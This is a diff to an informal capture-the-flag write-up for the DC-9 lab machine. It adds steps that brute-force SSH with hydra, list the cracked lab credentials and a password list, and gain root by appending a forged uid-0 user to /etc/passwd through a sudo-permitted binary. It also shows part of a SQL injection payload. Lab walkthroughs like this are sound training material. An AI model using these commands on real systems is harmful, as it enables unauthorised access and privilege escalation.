@@ -90,7 +90,7 @@ search=search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,Password,0x7c))+fro
 
 #### SSH
 
-hydra -L users -P pass ssh://172.22.222.4
+`hydra -L users -P pass ssh://172.22.222.4`
 
 ```
 [22][ssh] host: 172.22.222.4   login: chandlerb   password: UrAG0D!
@@ -98,6 +98,9 @@ hydra -L users -P pass ssh://172.22.222.4
 [22][ssh] host: 172.22.222.4   login: janitor   password: Ilovepeepee
 ```
 
+in janitor, we have
+
+/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
 ```
 BamBam01
 Passw0rd
@@ -106,3 +109,25 @@ P0Lic#10-4
 B4-Tru3-001
 4uGU5T-NiGHts
 ```
+
+`hydra -L users -P pass2 ssh://172.22.222.4`
+
+^^ gives us the login for fredf, where we have a sudo -l, which basically reads file from one place and appends it to another file / place, so what we do in this situation is
+
+```
+fredf@dc-9:/tmp$ openssl passwd -6 -salt xyz  1234
+$6$xyz$yi4TR7hO4A9BO9pNy9PTn2weMAlWj5r/joQU06UIWdIqGtI71dd10wSEo8MMskSav5eIc8c7zyqfcWOnqQ.VE/
+
+echo "root1:\$6\$xyz\$yi4TR7hO4A9BO9pNy9PTn2weMAlWj5r/joQU06UIWdIqGtI71dd10wSEo8MMskSav5eIc8c7zyqfcWOnqQ.VE/:0:0:root:/root:/bin/bash" > newetcpasswd
+
+fredf@dc-9:/tmp$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+
+sudo /opt/devstuff/dist/test/test newetcpasswd /etc/passwd
+```
+
+this ^^ appends the new user root1 with uid(0), gid(0) to /etc/passwd with a password of 1234, which we can su into
